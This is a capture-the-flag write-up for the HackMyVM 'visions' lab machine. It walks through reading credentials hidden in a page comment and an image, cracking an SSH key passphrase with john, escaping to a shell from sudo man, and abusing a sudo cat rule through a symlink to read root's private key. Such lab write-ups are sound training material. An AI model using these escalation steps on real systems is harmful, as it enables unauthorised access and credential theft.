### Write up for https://hackmyvm.eu/machines/machine.php?vm=visions ###

## Walkthrough



```bash
ip=10.10.10.101
url=http://$ip
```

```bash
threader3000
```

22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

80/tcp open  http    nginx 1.14.2



```bash
firefox $url &
view source code 
```

<!-- 
Only those that can see the invisible can do the imposible.
You have to be able to see what doesnt exist.
Only those that can see the invisible being able to see whats not there.
```text
-alicia -->
```

at the end of the source code we got 
 <img src="white.png"> 


we got a username : alicia

```bash
wget $url/white.png
```


tried several ways like stegseek, stegcracker etc without any result.

lets try to open the image in "photoshop like" programs.

lets change the color curves 
set them to input : 237 output : 13
we got username and pass
User: sophia
Pass: s*****************e

```bash
ssh -l sophia $ip
```

We are in. (Run ./flag.sh to get the userflag)

```bash
sudo -l 
/usr/bin/cat /home/isabella/.invisible
```

```bash
sudo /usr/bin/cat /home/isabella/.invisible 
```

we get the id_rsa of user isabella

copy that

```bash
pico id_rsa 
```

paste it 
ctrl + x `---> y`
```bash
chmod 600 id_rsa 
```

```bash
ssh isabella@127.0.0.1 -i id_rsa
```

Needs passphrase. Lets transfer it to our terminal

```bash
python3 -m http.server 2221
```

from our terminal wget $url:2221/id_rsa
```bash
chmod 600 id_rsa
```


```bash
/usr/bin/ssh2john id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Pass: i*******e

```bash
ssh isabella@127.0.0.1 -i id_rsa
```

```bash
sudo -l
```
    (emma) NOPASSWD: /usr/bin/man

```bash
sudo -u emma man man
```
!/bin/sh

```bash
$ id
```
```text
uid=1000(emma) gid=1000(emma) groups=1000(emma),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

```bash
emma@visions:~$ ls
```
note.txt
```bash
emma@visions:~$ cat note.txt 
```
I cant help myself.
```bash
emma@visions:~$ sudo -l
```

```text
User emma is a dead end.
```

Lets go back to where we start. (Sophia)

```text
User sophia may run the following commands on visions:
    (ALL : ALL) NOPASSWD: /usr/bin/cat /home/isabella/.invisible
```


We need to create a symbolic link to roots id_rsa, and then use sophia to read the file.
```bash
ssh again into isabella
```

```bash
mv .invisible .invisible_old
```
ln -s /root/.ssh/id_rsa .invisible
go back to sophia

```bash
sudo /usr/bin/cat /home/isabella/.invisible
```

root id_rsa

back to our terminal(kali)
```bash
pico id_rsa_root
```
paste
ctrl + x ---> y
```bash
chmod 600 id_rsa_root
ssh $ip -l root -i id_rsa_root
```

We are in

./flag.sh to get root flag
